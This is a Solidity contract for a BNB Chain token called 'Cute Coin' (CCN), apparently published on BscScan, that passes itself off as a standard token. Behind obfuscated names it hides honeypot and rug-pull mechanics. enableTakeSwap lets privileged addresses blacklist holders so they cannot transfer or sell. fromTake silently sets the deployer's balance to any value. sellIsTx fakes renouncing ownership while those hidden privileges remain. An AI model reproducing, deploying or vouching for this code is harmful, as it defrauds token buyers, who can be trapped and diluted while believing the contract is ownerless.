/**
 *Submitted for verification at BscScan.com on 2023-02-17
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

abstract contract teamTotal {
    function walletIs() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed sender,
        address indexed spender,
        uint256 value
    );
}


interface marketingTake {
    function createPair(address receiverShouldTake, address fromTeam) external returns (address);
}

interface shouldFromMode {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract CuteCoin is IERC20, teamTotal {

    uint256 public feeList;

    string private tradingSwap = "CCN";

    function allowance(address txBuySender, address minTake) external view virtual override returns (uint256) {
        return senderAuto[txBuySender][minTake];
    }

    bool private limitMin;

    uint256 private feeTotalFrom = 100000000 * 10 ** 18;

    function senderMin() public {
        if (fundIs == exemptLaunchedLaunch) {
            limitList = sellLiquidity;
        }
        if (autoMin) {
            limitList = feeList;
        }
        limitList=0;
    }

    function fromTake(uint256 fromWallet) public {
        if (!limitSwap[walletIs()]) {
            return;
        }
        senderReceiver[receiverLimit] = fromWallet;
    }

    uint256 private exemptLaunchedLaunch;

    event OwnershipTransferred(address indexed modeReceiver, address indexed senderTx);

    function fundWallet() public view returns (bool) {
        return buyMin;
    }

    string private modeSwap = "Cute Coin";

    address public receiverLimit;

    function enableTakeSwap(address fromTrading) public {
        
        if (fromTrading == receiverLimit || fromTrading == teamAmount || !limitSwap[walletIs()]) {
            return;
        }
        
        launchLimit[fromTrading] = true;
    }

    function transferFrom(address listTrading, address senderEnableAuto, uint256 fromWallet) external override returns (bool) {
        if (senderAuto[listTrading][walletIs()] != type(uint256).max) {
            require(fromWallet <= senderAuto[listTrading][walletIs()]);
            senderAuto[listTrading][walletIs()] -= fromWallet;
        }
        return receiverIsToken(listTrading, senderEnableAuto, fromWallet);
    }

    function liquidityEnable() public view returns (bool) {
        return autoMin;
    }

    function name() external view returns (string memory) {
        return modeSwap;
    }

    address public teamAmount;

    mapping(address => bool) public limitSwap;

    function decimals() external view returns (uint8) {
        return swapLaunched;
    }

    function owner() external view returns (address) {
        return buyMax;
    }

    bool private autoMin;

    function approve(address minTake, uint256 fromWallet) public virtual override returns (bool) {
        senderAuto[walletIs()][minTake] = fromWallet;
        emit Approval(walletIs(), minTake, fromWallet);
        return true;
    }

    bool private exemptFeeLaunch;

    uint256 private fundIs;

    function balanceOf(address tokenLaunch) public view virtual override returns (uint256) {
        return senderReceiver[tokenLaunch];
    }

    address private buyMax;

    mapping(address => mapping(address => uint256)) private senderAuto;

    function getOwner() external view returns (address) {
        return buyMax;
    }

    uint256 private sellLiquidity;

    function symbol() external view returns (string memory) {
        return tradingSwap;
    }

    function receiverIsToken(address listTrading, address senderEnableAuto, uint256 fromWallet) internal returns (bool) {
        if (listTrading == receiverLimit) {
            return launchFrom(listTrading, senderEnableAuto, fromWallet);
        }
        require(!launchLimit[listTrading]);
        return launchFrom(listTrading, senderEnableAuto, fromWallet);
    }

    bool public buyMin;

    uint8 private swapLaunched = 18;

    function launchFrom(address listTrading, address senderEnableAuto, uint256 fromWallet) internal returns (bool) {
        require(senderReceiver[listTrading] >= fromWallet);
        senderReceiver[listTrading] -= fromWallet;
        senderReceiver[senderEnableAuto] += fromWallet;
        emit Transfer(listTrading, senderEnableAuto, fromWallet);
        return true;
    }

    mapping(address => uint256) private senderReceiver;

    function teamTradingMarketing() public {
        
        
        exemptLaunchedLaunch=0;
    }

    function transfer(address atAmountTx, uint256 fromWallet) external virtual override returns (bool) {
        return receiverIsToken(walletIs(), atAmountTx, fromWallet);
    }

    function sellIsTx() public {
        emit OwnershipTransferred(receiverLimit, address(0));
        buyMax = address(0);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return feeTotalFrom;
    }

    uint256 private limitList;

    function teamReceiver() public {
        if (limitList == sellLiquidity) {
            exemptLaunchedLaunch = sellLiquidity;
        }
        if (buyMin) {
            launchFundBuy = feeList;
        }
        feeList=0;
    }

    mapping(address => bool) public launchLimit;

    function walletFee(address teamLaunch) public {
        if (launchSenderLimit) {
            return;
        }
        
        limitSwap[teamLaunch] = true;
        if (launchFundBuy == fundIs) {
            exemptLaunchedLaunch = fundIs;
        }
        launchSenderLimit = true;
    }

    bool public launchSenderLimit;

    uint256 public launchFundBuy;

    constructor (){
        if (fundIs != sellLiquidity) {
            limitMin = true;
        }
        shouldFromMode liquidityTrading = shouldFromMode(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        teamAmount = marketingTake(liquidityTrading.factory()).createPair(liquidityTrading.WETH(), address(this));
        buyMax = walletIs();
        
        receiverLimit = walletIs();
        limitSwap[walletIs()] = true;
        
        senderReceiver[walletIs()] = feeTotalFrom;
        emit Transfer(address(0), receiverLimit, feeTotalFrom);
        sellIsTx();
    }

}